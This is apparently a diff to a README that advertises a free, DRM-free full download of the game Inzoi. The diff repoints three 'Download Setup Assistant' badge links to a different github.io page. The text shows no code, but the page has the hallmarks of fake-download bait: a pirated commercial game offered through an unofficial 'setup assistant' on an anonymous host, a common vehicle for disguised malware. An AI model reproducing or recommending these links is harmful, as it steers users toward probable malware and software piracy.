@@ -1,6 +1,6 @@
 # Inzoi — Free Download & Full Installation Guide
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://inzoi-download-game.github.io/.github)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://chrissysattel70.github.io/.github/inzoi-game)
 
 ## 🧬 About the Game
 
@@ -25,7 +25,7 @@ With this guide, you'll enjoy the full experience of **Inzoi free download** wit
 
 ---
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://inzoi-download-game.github.io/.github)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://chrissysattel70.github.io/.github/inzoi-game)
 
 ---
 
@@ -47,7 +47,7 @@ With this guide, you'll enjoy the full experience of **Inzoi free download** wit
 - 🎮 No DRM, no internet connection, fully local install  
 - 🖥 Optimized for PC with Unreal Engine 5 visuals
   
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://inzoi-download-game.github.io/.github)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://chrissysattel70.github.io/.github/inzoi-game)
 
 ---
 
